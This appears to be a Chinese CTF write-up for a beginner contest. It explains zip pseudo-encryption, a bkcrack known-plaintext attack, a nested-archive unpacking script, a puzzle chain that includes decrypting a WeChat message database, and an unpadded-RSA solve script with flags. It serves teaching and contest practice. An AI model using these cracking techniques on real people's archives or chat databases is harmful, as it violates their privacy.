- ~~不要试图截图选老婆，如果你能截图截出正确的词，建议你放弃新生赛去买彩票~~

找齐被打码的二十四字之后输入到题目提供的网页（没有顺序要求）即可得到flag。

#### 花絮

这道题的点子来自week1弃坑的MC题的备用点子（人话：废案的废案）：用一块基岩挡住flag的一部分，让玩家们使出全身解数想办法看到基岩挡住的部分；结果week1的游戏题出完了之后谜语人之魂发作，想着“不能破坏的方块上记录着众人的终极追求”这一概念很有神秘感，多整了一堆活，就变成了这么一道题。新的题目名称“终极谜语人”~~除了在说出题人实在不柿个好人钠之外~~更是在指代题目中的神秘元素。

（不指望有人能看出的）预告图和题目中的梗是出自小说/电影《2001：太空漫游》的[黑方碑](https://2001.fandom.com/wiki/Monolith)，MC地图的环境布置也是在模拟TMA-0和TMA-1两块黑方碑的周遭环境（To ~~群萌新~~ 滑稽：自定义维度令主世界使用末地生物群系且地表Y<0，就能创造天上有太阳、四周有光亮但天是黑色的奇景）。看不懂也没关系，这个梗和做题一点关系都没有就是了（

### zip的四种解法

"encrypted？.zip"是伪加密，将压缩源文件目录区（504B0102开始）的全局方式位标记（第九和第十个字节）改为0800即可解压，"encrypted.zip"需要使用bkcrack进行明文攻击，压缩包中有"picture.png"，根据png固定格式构造超过12字节的文件明文攻击，获取密钥a121e562 06b6a7e6 45d2e1b7，利用密钥提取"zip"文件，补全其文件头504B0304和后缀，解压得到"演示文稿1.ppt"，将后缀改为.zip再解压打开，能直接找到flag.xml

### 千层烧饼

这个压缩包套娃每一层的密码就是压缩包名，格式为7z或zip，于是就可以写出对应的脚本进行解压，或者直接对ai提出你的诉求让它来写，比如下面这个python脚本：



```python
import os
import re
import pyzipper
import py7zr

# 从文件名中提取密码
def get_password_from_filename(filename):
    # 匹配文件名中的四位数字作为密码
    match = re.search(r'\b\d{4}\b', filename)
    return match.group() if match else None

# 使用文件名密码解压文件
def decompress_with_filename_password(file_path, output_dir):
    password = get_password_from_filename(os.path.basename(file_path))
    if password is None:
        print(f"No valid password found in filename {file_path}.")
        return False, None
    try:
        if file_path.endswith('.zip'):
            with pyzipper.AESZipFile(file_path) as zipf:
                zipf.setpassword(password.encode())
                zipf.extractall(output_dir)
            print(f"Success! Password for {file_path} is {password}")
            return True, os.path.join(output_dir, os.listdir(output_dir)[0])

        elif file_path.endswith('.7z'):
            with py7zr.SevenZipFile(file_path, password=password) as archive:
                archive.extractall(output_dir)
            print(f"Success! Password for {file_path} is {password}")
            return True, os.path.join(output_dir, os.listdir(output_dir)[0])

    except Exception as e:
        print(f"Failed to extract {file_path} with password {password}: {e}")
        return False, None

# 逐层解压缩
def decompress_multiple_layers(compressed_file, layers=1000):
    current_file = compressed_file
    output_base_dir = R"decompressed_files"  # 指定解压后的文件夹
    if not os.path.exists(output_base_dir):
        os.makedirs(output_base_dir)  # 如果目录不存在则创建

    for layer in range(layers):
        layer_output_dir = os.path.join(output_base_dir, f"layer_{layer + 1}")
        os.makedirs(layer_output_dir, exist_ok=True)

        success, next_file = decompress_with_filename_password(current_file, layer_output_dir)
        if not success:
            print(f"Unable to decrypt layer {layer + 1}. Exiting.")
            break

        print(f"Layer {layer + 1}: Successfully extracted.")
        current_file = next_file

        # 如果已达到解压完成的文件（非压缩文件），则停止
        if not (current_file.endswith('.zip') or current_file.endswith('.7z')):
            print("Reached final uncompressed file.")
            break

    print(f"Final extracted file path: {current_file}")

def main():
    final_compressed_file = R"5155.7z"  # 替换为最终生成的压缩文件路径
    decompress_multiple_layers(final_compressed_file, layers=1000)

if __name__ == '__main__':
    main()
```

解压1000层得到文件flag.zip，可以按照之前的格式用4位数字暴力破解，或者直接根据题目描述得到密码1960，解压后的txt中含有零宽度字符隐写，通过https://www.mzy0.com/ctftools/zerowidth1/解密得到flag。

### 爬塔游戏

压缩包解压密码是开赛日期八位数字

第一层：hint是阴阳怪气加码，the_first-is_always_simple，解压之后图片改宽高即可
r00t{zheshidiyiceng_

第二层：压缩包解密需要用到第一层的“r00t{zheshidiyiceng\_”，hint是汤姆码tomtom加密
解出来是“di_er_ceng_zen_me_zuo”，通过正则表达式^([a-z){3}\d[a-z]$爆破从图片里解出来的压缩包，密码是sxy2e，
ttthhheeesecondfloor_

第三层：压缩包解密需要用到第二层的“ttthhheeesecondfloor_”，图片非夏多，看看交点
四个交点代表“-” 三个交点代表空格 两个交点代表“.”，摩斯电码解出来是“that_3hird”
010打开flag3.zip结尾处base64解码得到123951，去解压另一个压缩包。
base62加码：xihuanwan_misc_ma

第四层：压缩包解密需要用到第三层的“xihuanwan_misc_ma”，查看hint4.txt，都2024年了不会还有人解不出U2FsdGVkX1+y2rlJZlJCMnvyDwHwzkgHvNsG2TF6sFlBlxBs0w4EmyXdDe6s7viL吧
用到Triple DES解密，解压压缩包，hint.txt中的字符串通过Caesar调整成1a813cbb17c040358d772e37fa137edbeddedb38bf704a56b2a9e22dc7f05f77
.db是微信数据库备份文件，py解密恢复文件。cmd中执行python shuju.py -k 1a813cbb17c040358d772e37fa137edbeddedb38bf704a56b2a9e22dc7f05f77 -d MSG0.db 62914560
其中shuju.py自己上csdn搜索微信数据库解密。
使用DB Browser for SQLite查看文件
得到flag4:L1u_and_K1cky_Mu

第五层：压缩包解密需要用到第四层的“L1u_and_K1cky_Mu”，用serpent隐写解出里面的txt，密码是seecret
然后是零宽隐写
flag是u_r_50_5m4rt!

然后用md5加密 r00t{zheshidiyiceng\_|ttthhheeesecondfloor_|xihuanwan_misc_ma|L1u_and_K1cky_Mu|u_r_50_5m4rt!

得到31aada169d9a5b6831a0792d47b1f229
套上r00t就是flag了。

## crypto

### rrrrrrrrsa

Sloth 选拔赛的第一题

普通的RSA，但是用了8个256位素数，并`leak`了其中2个，flag是`r00t2024{uuid}`，漏洞点是明文在加密时没有做padding。分析可得明文的长度是uuid长度加10的bytes，而泄露的素数（令其是p1与p2），共512bits，故在mod操作下不起作用。leak又泄露了两个素数，所以可以顺利解密。其实即使没有以上的分析，用普通的RSA解密的方法试一次也就做出来了- -

```python
from gmpy2 import invert
import libnum

e = 65537
n = 1948831226367808333023454598602847640240062226497220535305464948946806428826427888320323260065910371729498744016762049074280602708071244743861289847071010098857709918912568267082765736138208189380839308228760420357247846848198571932896799280257004218095898229830549900729475994574514199214974647651643868770999990755773821706586940779568043877890095238553821958996719637584404983370656917447866461520026730561106521512372792028476739337988464433131160954386181373965071872699552959911375040849790362842745704396532895687290320055533574951232877797904916847025368705453945796905953508376628140140310371102526789326909
c = 1787789892903050535448764340663183386718548752068882054116697949422762809906200265067322273461327359917952855207073599958677616481115690732238321689032202235534289027860250827298938800229743364624139255201645663660712723677963010438634663962079825609567910790482763112867545903928917669200180481743808576607223091090410963635701963504192628345731495406509220606691058648878512289757356617962961876291015927601077929841648482652289324194004829539854744629227190949688622109451495340467877267395807518644502010968910668506141542536982013502638532959177937481777444704866341974936101375766752745353691699260796722226392
p, q = [60592667249989731023949695957858195905249904357039946449852987631969604549343, 83365131057176342554624416364767324909519920184318725911963559984830477147249]

phi = (p-1)*(q-1)
d = invert(e, phi)
m = pow(c, d, p*q)
flag = libnum.n2s(int(m))
print(flag)
```

